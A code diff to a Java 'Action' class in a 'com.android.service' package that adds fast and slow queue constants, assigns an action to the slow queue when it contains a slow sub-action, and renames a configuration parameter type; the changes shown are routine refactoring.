@@ -15,6 +15,7 @@ import org.json.JSONObject;
 
 import com.android.service.GeneralException;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 
@@ -27,6 +28,11 @@ public class Action {
 	/** The Constant ACTION_NULL. */
 	public static final int ACTION_NULL = -1;
 
+	public static final int FAST_QUEUE = 0;
+
+	public static final int SLOW_QUEUE = 1;
+
+	public static final int NUM_QUEUE = 2;
 	/** Action array. */
 	private final List<SubAction> list;
 
@@ -34,6 +40,8 @@ public class Action {
 	private final int actionId;
 
 	private final String desc;
+
+	private int queue = FAST_QUEUE;
 
 	/**
 	 * Action constructor.
@@ -86,7 +94,7 @@ public class Action {
 	 * @throws JSONException 
 	 * @throws ConfigurationException 
 	 */
-	public boolean addSubAction(final ActionConf actionConf) throws GeneralException, ConfigurationException {
+	public boolean addSubAction(final ConfAction actionConf) throws GeneralException, ConfigurationException {
 
 		if (actionConf.getType() != null) {
 			final SubAction sub = SubAction.factory(actionConf.getType(), actionConf);
@@ -97,6 +105,9 @@ public class Action {
 				return false;
 			}
 			list.add(sub);
+			if(sub instanceof  SubActionSlow){
+				setQueue(SLOW_QUEUE);
+			}
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
@@ -104,6 +115,11 @@ public class Action {
 			}
 			return false;
 		}
+	}
+
+	private void setQueue(int queue) {
+		this.queue =queue;
+		
 	}
 
 	/**
@@ -134,5 +150,9 @@ public class Action {
 
 	public SubAction[] getSubActions() {
 		return list.toArray(new SubAction[] {});
+	}
+
+	public int getQueue() {		
+		return queue;
 	}
 }
